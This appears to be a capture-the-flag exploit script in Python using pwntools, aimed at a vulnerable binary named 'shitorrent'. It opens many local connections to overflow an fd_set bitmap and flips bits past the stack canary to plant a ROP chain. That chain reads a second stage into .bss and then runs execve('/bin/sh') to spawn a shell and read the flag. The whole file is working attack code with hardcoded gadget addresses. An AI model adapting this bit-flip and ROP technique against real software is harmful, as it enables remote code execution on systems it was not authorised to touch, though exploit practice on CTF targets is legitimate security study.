from pwn import *
import socket
import random

s = process('./shitorrent')

# prepare sockets
port = random.randint(999,2222)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', port))
sock.listen(0)

# gadget for ROP
pop_rdi = 0x400706
pop_rsi = 0x407888
pop_rdx = 0x465855
pop_rax = 0x4657fc
pop_rsp = 0x403368
syscall = 0x490ec5
bss_addr = 0x6ddbc0

def menu(choice):
    s.recvuntil('[g]et flag\n')
    s.sendline(choice)

def add(host, port, target='TORADMIN'):
    menu('a')
    s.recvuntil('enter host\n')
    s.sendline(host)
    s.recvuntil('enter port\n')
    s.sendline(str(port))
    conn, addr = sock.accept() # prepared_socket -> shitorrent
    conn.recv(1024)
    conn.sendall(target)
    conn.close()

def remove(bit_index):
    menu('r')
    s.sendline(str(bit_index))

def getflag():
    s.sendline('id')
    print s.recv()
    s.sendline('cat flag')
    print s.recv()
    s.interactive()

for i in range(0x88*8 + 8*8 + 8*8 - 8): # fd_size + canary + rbp - some_bits
    add('127.0.0.1', port, 'LISTENER')

# where to start flipping bit
base_addr = 1216

# read(0, bss, 0x300)
# rip -> bss
payload  = ''
payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss_addr)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(syscall)
payload += p64(pop_rsp) + p64(bss_addr)

for i in range(len(payload)*8*8):
    add('127.0.0.1', port)

bit = lambda x:bin(x)[2:].rjust(64,'0')

for i in range(len(payload)/8):
    zero = bit(u64(payload[i*8:(i+1)*8]))[::-1]
    for j in range(len(zero)):
        if zero[j] == '0':
            remove(base_addr+j)
    base_addr += 64

# execve('/bin/sh', 0, 0)
payload  = ''
payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdi) + p64(bss_addr+80)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall) + p64(0)
payload += '/bin/sh' + '\x00'

menu('q')
s.sendline(payload)
getflag()
